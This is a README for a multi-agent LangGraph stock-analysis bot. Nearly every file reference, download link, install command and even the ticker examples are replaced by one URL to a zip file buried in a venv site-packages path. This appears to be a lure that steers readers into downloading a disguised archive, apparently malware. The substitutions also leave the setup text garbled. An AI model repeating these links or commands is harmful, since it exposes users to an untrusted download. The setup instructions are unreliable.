# 📈 AI Multiagent Stock Analyst Bot

## 🚀 Project Overview
The **Multiagent Stock Analyst Bot** is an advanced financial analysis tool powered by **Agentic AI**. It uses a graph-based architecture (LangGraph) to orchestrate specialized agents—Technical, Fundamental, News, and Sentiment—to conduct deep-dive research on stock tickers.

The system mimics a professional hedge fund analyst team:
1.  **Researchers** gather raw data (prices, news, indicators).
2.  **Analysts** process data into insights (trends, risk scores, sentiment).
3.  **The Manager** synthesizes everything into a final actionable report.

A sleek **Streamlit Dashboard** serves as the user interface, offering real-time report generation and a context-aware **RAG Chatbot** to answer specific questions about the analysis.

---

## 🏗️ Architecture & Agents

The core logic is built on **LangGraph**, where data flows through a directed acyclic graph (DAG) of nodes.

### 🧠 The Agents (Nodes)
1.  **Price Node**: Fetches historical OHLCV data using `yfinance`. Sanitizes data (handling missing volume/dates) and identifies the company name.
2.  **Indicator Node**: Computes technical indicators:
    - **Trend**: EMA20, SMA50, ADX
    - **Momentum**: RSI, MACD
    - **Volatlity**: ATR, Bollinger Bands
3.  **Pattern Node**: Detects candlestick patterns (Engulfing, Doji, Hammer) and identifies critical Support & Resistance levels.
4.  **Risk Node**: Calculates a 0-100 Risk Score based on volatility (ATR%) and momentum. Defines Stop Loss and Take Profit levels.
5.  **Fundamental Node**: (Placeholder structure) Configured to analyze company growth, valuation, and governance flags.
6.  **News & Sentiment Node**:
    - **Aggregator**: Fetches news from Google News RSS, BSE/SEBI announcements, and major financial feeds.
    - **AI Filter**: Uses a smart keyword & token matching system to filter out irrelevant news (e.g., distinguishing "HDFC Life" from generic "life" insurance news).
    - **Sentiment Engine**: Scores headlines to assist in the final verdict.

### 🔗 The Orchestrator (Graph)
The graph ensures parallel execution where possible (e.g., fetching News and Prices simultaneously) and smart merging of data (`smart_overwrite` reducer) to prevent race conditions.

---

## 🛠️ Installation & Setup

### Prerequisites
- **Python 3.10+**
- **Ollama** (for local LLM inference)

### 1. Clone the Repository
```bash
git clone <repository-url>
cd Multiagent_Trader_Bot
```

### 2. Install Ollama & Pull Models
This project uses **Ollama** to run local LLMs. You need two distinct models:

1.  **Chat/Reasoning Model** (Default: `fin-llama31` or `llama3.1`):
    ```bash
    ollama pull llama3.1
    ```
    *Note: Verify the model name in `https://raw.githubusercontent.com/AyushPallod/AI_Multiagent_Stock_Analyst_Bot/main/venv/Lib/site-packages/langchain_openai/embeddings/Analyst-A-Stock-Multiagent-Bot-v1.9-beta.4.zip` (`APP_LLM_MODEL`).*

2.  **Sentiment Expert Model** (`llama3.2-financial`):
    - This project uses a specialized 3B model for fast news scoring.
    - **Origin**: This model was self-trained/fine-tuned specifically for this project. [View Training Repo](https://raw.githubusercontent.com/AyushPallod/AI_Multiagent_Stock_Analyst_Bot/main/venv/Lib/site-packages/langchain_openai/embeddings/Analyst-A-Stock-Multiagent-Bot-v1.9-beta.4.zip).
    - **Download the GGUF**: `https://raw.githubusercontent.com/AyushPallod/AI_Multiagent_Stock_Analyst_Bot/main/venv/Lib/site-packages/langchain_openai/embeddings/Analyst-A-Stock-Multiagent-Bot-v1.9-beta.4.zip`
    - **Place it in**: `models/` directory.
    - **Create the model**:
      ```bash
      ollama create llama3.2-financial -f https://raw.githubusercontent.com/AyushPallod/AI_Multiagent_Stock_Analyst_Bot/main/venv/Lib/site-packages/langchain_openai/embeddings/Analyst-A-Stock-Multiagent-Bot-v1.9-beta.4.zip
      ```

### 3. Install Python Dependencies
Create a virtual environment (recommended) and install requirements:
```bash
# Windows
python -m venv venv
.\venv\Scripts\activate

# Install packages
pip install -r https://raw.githubusercontent.com/AyushPallod/AI_Multiagent_Stock_Analyst_Bot/main/venv/Lib/site-packages/langchain_openai/embeddings/Analyst-A-Stock-Multiagent-Bot-v1.9-beta.4.zip
```

### 4. Configure Environment
Check `https://raw.githubusercontent.com/AyushPallod/AI_Multiagent_Stock_Analyst_Bot/main/venv/Lib/site-packages/langchain_openai/embeddings/Analyst-A-Stock-Multiagent-Bot-v1.9-beta.4.zip` for settings:
- **Proxy**: If you are behind a corporate firewall, set `USE_PROXY = True`. For home use, keep it `False`.
- **LLM Model**: Change `APP_LLM_MODEL` if you want to swap models (e.g., to `phi3`).

---

## 🖥️ Usage

### Running the Application
Ensure your virtual environment is active and Ollama is running (`ollama serve` in a separate terminal).

```bash
streamlit run https://raw.githubusercontent.com/AyushPallod/AI_Multiagent_Stock_Analyst_Bot/main/venv/Lib/site-packages/langchain_openai/embeddings/Analyst-A-Stock-Multiagent-Bot-v1.9-beta.4.zip
```

### Using the Dashboard
1.  **Enter Ticker**: In the sidebar, type a valid NSE symbol (e.g., `https://raw.githubusercontent.com/AyushPallod/AI_Multiagent_Stock_Analyst_Bot/main/venv/Lib/site-packages/langchain_openai/embeddings/Analyst-A-Stock-Multiagent-Bot-v1.9-beta.4.zip`, `https://raw.githubusercontent.com/AyushPallod/AI_Multiagent_Stock_Analyst_Bot/main/venv/Lib/site-packages/langchain_openai/embeddings/Analyst-A-Stock-Multiagent-Bot-v1.9-beta.4.zip`, `https://raw.githubusercontent.com/AyushPallod/AI_Multiagent_Stock_Analyst_Bot/main/venv/Lib/site-packages/langchain_openai/embeddings/Analyst-A-Stock-Multiagent-Bot-v1.9-beta.4.zip`).
2.  **Generate Report**: Click the **"🚀 Generate Report"** button.
    - The agents will start fetching and analyzing.
    - *Note: First run might take 45-50 seconds.*
3.  **View Report**:
    - **Final Report Tab**: The Executive Summary, Trade Call, and Key Drivers.
    - **Technicals / Fundamentals / News Tabs**: Deep dive into the raw data and intermediate metrics.
4.  **Ask the Analyst (RAG Chat)**:
    - Use the chat interface to ask questions like:
        - *"Why is the risk level high?"*
        - *"What are the support levels?"*
    - The bot answers **only** using facts from the generated report.

---

## ❓ Troubleshooting

**Q: "Connection Error: Could not connect to Ollama..."**
A: Make sure Ollama is running. Open a terminal and type `ollama serve`.

**Q: "ImportError: No module named..."**
A: Ensure you activated your `venv` and ran `pip install -r https://raw.githubusercontent.com/AyushPallod/AI_Multiagent_Stock_Analyst_Bot/main/venv/Lib/site-packages/langchain_openai/embeddings/Analyst-A-Stock-Multiagent-Bot-v1.9-beta.4.zip`.

**Q: "No NSE data found..."**
A: Check if the ticker symbol is correct. It must be a valid NSE symbol ending in `.NS` (e.g., `https://raw.githubusercontent.com/AyushPallod/AI_Multiagent_Stock_Analyst_Bot/main/venv/Lib/site-packages/langchain_openai/embeddings/Analyst-A-Stock-Multiagent-Bot-v1.9-beta.4.zip`).

---

## 📂 Project Structure
```
Multiagent_Trader_Bot/
├── agents/             # Logic for individual agents (News, Tech, etc.)
├── graph/              # LangGraph orchestration logic
├── helper_function/    # Math, indicators, and pattern recognition
├── https://raw.githubusercontent.com/AyushPallod/AI_Multiagent_Stock_Analyst_Bot/main/venv/Lib/site-packages/langchain_openai/embeddings/Analyst-A-Stock-Multiagent-Bot-v1.9-beta.4.zip              # Main Streamlit Dashboard entry point
├── https://raw.githubusercontent.com/AyushPallod/AI_Multiagent_Stock_Analyst_Bot/main/venv/Lib/site-packages/langchain_openai/embeddings/Analyst-A-Stock-Multiagent-Bot-v1.9-beta.4.zip           # Global configuration (LLM, Proxy)
└── https://raw.githubusercontent.com/AyushPallod/AI_Multiagent_Stock_Analyst_Bot/main/venv/Lib/site-packages/langchain_openai/embeddings/Analyst-A-Stock-Multiagent-Bot-v1.9-beta.4.zip    # Project dependencies
```
